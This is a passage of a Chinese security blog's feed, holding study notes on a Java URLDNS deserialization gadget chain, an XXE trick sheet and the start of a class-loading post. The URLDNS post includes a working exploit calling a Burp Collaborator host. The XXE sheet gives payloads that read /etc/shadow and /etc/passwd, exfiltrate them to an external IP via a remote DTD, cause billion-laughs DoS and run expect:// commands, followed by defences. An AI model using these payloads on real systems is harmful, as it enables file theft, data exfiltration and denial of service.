punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><ol><li><a href="https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0">https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0</a>                            白日梦组长</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS利用链分析</title>
      <link href="/2021/11/30/urldns-lian-fen-xi/"/>
      <url>/2021/11/30/urldns-lian-fen-xi/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>第一个gadget chain分析，因为zhege比较简单。</p><h5 id="触发反序列化的条件"><a href="#触发反序列化的条件" class="headerlink" title="触发反序列化的条件"></a>触发反序列化的条件</h5><ol><li>类要继承Serializable：java的序列化以及反序列化一定要继承Serializable。</li><li>找到入口类（重写readObject，调用常见的函数，参数类型宽泛，最好jdk自带）</li><li>调用链 相同名称，相同类型</li><li>执行类中的方法(RCE,SSRF等漏洞)</li><li>反序列化入口</li></ol><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>（我认为）挖gadget需要先找到执行类，猜测URLDNS的作者可能是想挖一个SSRF，因此想到URL这个原生类。因为要挖链子，所以要尽量找同名的方法，可以看到URL有hashCode方法。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hashCode <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>        hashCode <span class="token operator">=</span> handler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟进handler.hashCode()，可以看到执行了getHostAddress方法。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/urldns1.png" style="zoom: 67%;" /><p>而getHostAddress方法执行了getByName方法，getByName方法用于解析域名，该DNS解析过程自然是服务端发起的请求，也就达到了SSRF的目的。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">protected</span> <span class="token keyword">synchronized</span> InetAddress <span class="token function">getHostAddress</span><span class="token punctuation">(</span>URL u<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>u<span class="token punctuation">.</span>hostAddress <span class="token operator">!=</span> null<span class="token punctuation">)</span>            <span class="token keyword">return</span> u<span class="token punctuation">.</span>hostAddress<span class="token punctuation">;</span>        String host <span class="token operator">=</span> u<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>host <span class="token operator">==</span> null <span class="token operator">||</span> host<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                u<span class="token punctuation">.</span>hostAddress <span class="token operator">=</span> InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//关键</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnknownHostException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> null<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> se<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> null<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> u<span class="token punctuation">.</span>hostAddress<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在找到了链子的后半段：</p><p>URL.hashCode() -&gt;URLStreamHandler.hashCode()-&gt;URLStreamHandler.getHostAddress()-&gt;InetAddress.getByName()</p><p>接下来找连接URL.hashCode()的前半段，很容易想到最好是原生类，并且readObject方法中一层接一层最终触发了hashCode方法。观察HashMap类的readObject最后几行调用了hash方法，而如果key不为null则调用key的hashCode方法，也就是说如果key是URL类的对象，则就会调用URL.hashCode()。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>ObjectInputStream s<span class="token punctuation">)</span>        <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//...略</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> mappings<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                    K key <span class="token operator">=</span> <span class="token punctuation">(</span>K<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>                    V value <span class="token operator">=</span> <span class="token punctuation">(</span>V<span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span>Object key<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> h<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token punctuation">(</span>h <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此整条链子：</p><pre class="line-numbers language-java"><code class="language-java">HashMap<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>HashMap<span class="token punctuation">.</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>URL<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>URL<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span>URLStreamHandler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>URLStreamHandler<span class="token punctuation">.</span><span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>InetAddress<span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="错误的exp"><a href="#错误的exp" class="headerlink" title="错误的exp"></a>错误的exp</h5><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>MalformedURLException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UrlDns</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://?????.ceye.io"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        serialize(hashmap);</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap <span class="token operator">=</span> <span class="token punctuation">(</span>HashMap<span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地测试执行反序列化会发现并没有触发DNS解析。</p><p>这是因为Hashmap的put方法也会执行URL的hashCode()</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">putVal</span><span class="token punctuation">(</span><span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注意到如果hashCode不等于初始化的-1时则直接return hashCode，如果用这个序列化的字节流反序列化肯定不会进行DNS解析。因此，我们需要修改hashCode的值为-1。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>hashCode <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>        hashCode <span class="token operator">=</span> handler<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> hashCode<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h5><p>通过反射修改属性即可，注意hashCode为私有属性。需要通过setAccessible设置作用域。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>MalformedURLException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>HashMap<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UrlDns</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchFieldException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        URL url<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://nqhaouynesbyaf4nivnxzrpwangh46.burpcollaborator.net"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>url<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Field hashcode<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashcode<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashcode<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        serialize(hashmap);</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"urldns.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap <span class="token operator">=</span> <span class="token punctuation">(</span>HashMap<span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><p>1.<a href="https://blog.csdn.net/qq_47886905/article/details/123531299">https://blog.csdn.net/qq_47886905/article/details/123531299</a></p><p>2.<a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=fc78460cf16000301f7b3b1c07529ee0">https://www.bilibili.com/video/BV16h411z7o9?p=2&amp;vd_source=fc78460cf16000301f7b3b1c07529ee0</a></p><p>3.<a href="https://www.cnblogs.com/starrys/p/15564335.html">https://www.cnblogs.com/starrys/p/15564335.html</a></p><p>4.<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Trick总结——XXE</title>
      <link href="/2021/11/25/trick-xxe/"/>
      <url>/2021/11/25/trick-xxe/</url>
      
        <content type="html"><![CDATA[<h4 id="有回显，读文件："><a href="#有回显，读文件：" class="headerlink" title="有回显，读文件："></a>有回显，读文件：</h4><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><root><name>&xxe;</name></root><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="无回显，外带："><a href="#无回显，外带：" class="headerlink" title="无回显，外带："></a>无回显，外带：</h4><h5 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h5><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://49.232.???.???/?p=%file;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有些时候读不出来，需要编码。</p><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"><!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://49.232.???.???/?p=%file;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://139.9.???.???/exp/squirt1e.dtd">%remote;%int;%send;]><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h4><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0"?>     <!DOCTYPE lolz [     <!ENTITY lol "lol">     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">     <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">     <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">     <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">     <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">     <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">     <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">     ]>     <lolz>&lol9;</lolz><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>php需要安装expect拓展。</p><pre class="line-numbers language-xml-dtd"><code class="language-xml-dtd"><?xml version="1.0" encoding="utf-8"?> <!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "expect://whoami" >]><root><name>&xxe;</name></root><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:80&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;</code></pre><h4 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h4><p>1.使用开发语言提供的禁用外部实体的方法</p><pre><code>PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</code></pre><p>2.过滤和验证用户提交的<code>XML数据</code></p><p>3.过滤关键词<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY SYSTEM</code>、<code>PUBLIC</code></p><p>4.不允许XML中含有任何自己声明的<code>DTD</code></p><p>5.有效的措施：配置<code>XML parser</code>只能使用<code>静态DTD</code>，禁止外来引入</p><p>对于<code>Java</code>来说，直接设置相应的属性值为<code>false</code>即可</p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>1.<a href="https://www.cnblogs.com/icml8/p/16289190.html">https://www.cnblogs.com/icml8/p/16289190.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Trick </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计基础—类加载</title>
      <link href="/2021/11/20/java-shen-ji-ji-chu-lei-jia-zai/"/>
      <url>/2021/11/20/java-shen-ji-ji-chu-lei-jia-zai/</url>
      
        <content type="html"><![CDATA[<p>运行Java时，不会一次性的把class文件加载进内存，而是通过类加载机制进行动态加载，从而转换成java.lang.Class类的一个实例。</p><p>JAVA四种修饰符的访问权限的，<a href="https://blog.csdn.net/kepengs/article/details/107512618?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-107512618-blog-107726158.pc_relevant_multi_platform_whitelistv1&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-107512618-blog-107726158.pc_relevant_multi_platform_whitelistv1&utm_relevant_index=1">图出自鹏鹏哥哥的小红帽</a></p><p><img src="https://img-blog.csdnimg.cn/20200722142142337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2tlcGVuZ3M=,size_16,color_FFFFFF,t_70" alt="img"></p><h4 id="ClassLoader类"><a href="#ClassLoader类" class="headerlink" title="ClassLoader类"></a>ClassLoader类</h4><p>Java提供了ClassLoader类实现类加载。</p><h5 id="loadClass-String-name-方法"><a href="#loadClass-String-name-方法" class="headerlink" title="loadClass(String name)方法"></a>loadClass(String name)方法</h5><p>加载名称为name的类，返回的结果是java.lang.Class类的实例。</p><p>通过阅读源码可知，loadClass方法的运行过程为：</p><ol><li>调用findLoadedClass检查类是否已经被加载。</li><li>如果未被加载，则使用加载器的父类加载器进行加载。（递归逐级向上检查父类加载器能否加载）</li><li>如果父类加载器无法对该类进行加载时，则会调用自身的findClass方法，因此可以重写findClass方法来完成一些类加载的特殊要求。</li></ol><h5 id="defineClass-String-name-byte-b-int-off-int-len"><a href="#defineClass-String-name-byte-b-int-off-int-len" class="headerlink" title="defineClass(String name,byte[] b,int off,int len)"></a>defineClass(String name,byte[] b,int off,int len)</h5><p>将字节数组中的内容转换成Java类，返回结果是java.lang.Class类的实例，该方法声明为final，无法被重写。</p><p>因此，重写findClass方法就可以通过调用defineClass来实现自定义加载类。</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">findClass</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> ClassNotFoundException <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 